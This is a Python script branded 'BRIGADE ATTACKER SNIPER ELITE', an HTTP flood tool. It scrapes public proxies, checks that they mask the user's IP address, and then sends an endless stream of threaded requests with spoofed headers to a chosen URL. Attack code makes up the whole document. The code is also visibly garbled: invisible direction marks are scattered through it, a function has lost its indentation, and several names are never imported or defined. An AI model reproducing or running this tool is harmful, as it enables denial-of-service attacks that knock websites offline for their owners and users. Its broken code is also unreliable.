‎#!/usr/bin/python3
‎# -*- coding: utf-8 -*-
‎import os
‎import time
‎import socket
‎import getpass
‎import requests as r, os, threading, random, click, fake_headers
‎from threading import Thread
‎from fake_headers import Headers
‎os.system("clear")

# Colors
class bcolors:
    KUN = '\033[95m'
    FAYAKUN = "\033[37m"

attemps = 0
os.system("clear")
print("""
\033[37m
╔═════╗╔════╗
‎║▒╔══╗▒╔══╗▒║        
‎║▒║   ║▒║  ║▒║╔═╗   
‎║▒║   ║▒║  ║▒║║▒║
‎║▒║   ║▒║  ║▒║║▒║  
║▒║   ║▒╚══║▒║╝▒║  
║▒║   ╚════║▒║║▒║          
╚═╝    ╔═╗ ╚═╝║▒║
        ║▒╚════╝▒║
        ╚════════╝
‎\033[96m╔════════════════════════════════════════════════╗
‎\033[96m║\033[34m BRIGADE ATTACKER SNIPER ELITE \033[96m║
‎\033[96m║\033[33m INTERNAL SCRIPT \033[96m║
‎\033[96m║\033[32m By: KF'99 \033[96m║
‎\033[96m║\033[95m ——o0o—— \033[96m║
‎\033[96m╚════════════════════════════════════════════════
‎""")
‎‎# Password authentication function
‎def authenticate():
‎password = "BASe" # The password to access the tool
‎user_password = getpass.getpass(prompt="\033[1;36mEnter the password to access the tool: \033[0m")
‎if user_password != password:
‎print("\033[1;31mIncorrect password. Exiting...\033[0m")
‎exit()
‎
‎def check_prox(array, url):
‎	ip = r.post("http://ip.beget.ru/").text
‎	for prox in array:
‎		thread_list = []
‎		t = threading.Thread (target=check, args=(ip, prox, url))
‎		thread_list.append(t)
‎		t.start()
‎
‎def check(ip, prox, url):
‎	try:
‎		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
‎	except:
‎		ipx = ip
‎	if ip != ipx:
‎		thread_list = []
‎		t = threading.Thread (target=ddos, args=(prox, url))
‎		thread_list.append(t)
‎		t.start()
‎
‎def ddos(prox, url):
‎	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
‎	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
‎	color = random.choice(colors)
‎	while True:
‎		headers = Headers(headers=True).generate()
‎		thread_list = []
‎		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
‎		thread_list.append(t)
‎		t.start()
‎
‎def start_ddos(prox, url, headers, proxies, color):
‎	try:
‎		s = r.Session()
‎		req = s.get(url, headers=headers, proxies=proxies)
‎		if req.status_code == 200:
‎			print(color+"{}_proxy ".format(prox))
‎	except:
‎		pass
‎
‎@click.command()
‎@click.option('--proxy', '-p', help="File with a proxy")
‎@click.option('--url', '-u', help="URL")
‎def main(proxy, url):
‎	clear()
‎	logo()
‎	if url == None:
‎		url = input("URL: ")
‎	if url[:4] != "http":
‎		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
‎		exit()
‎	if proxy == None:
‎		while True:
‎			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
‎			array = req.text.split()
‎			print(Back.YELLOW+Fore.WHITE+"Found {} new proxies".format(len(array))+Style.RESET_ALL)
‎			check_prox(array, url)
‎	else:
‎		try:
‎			fx = open(proxy)
‎			array = fx.read().split()
‎			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
‎			check_prox(array, url)
‎		except FileNotFoundError:
‎			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
‎			exit()
‎
‎main()
‎
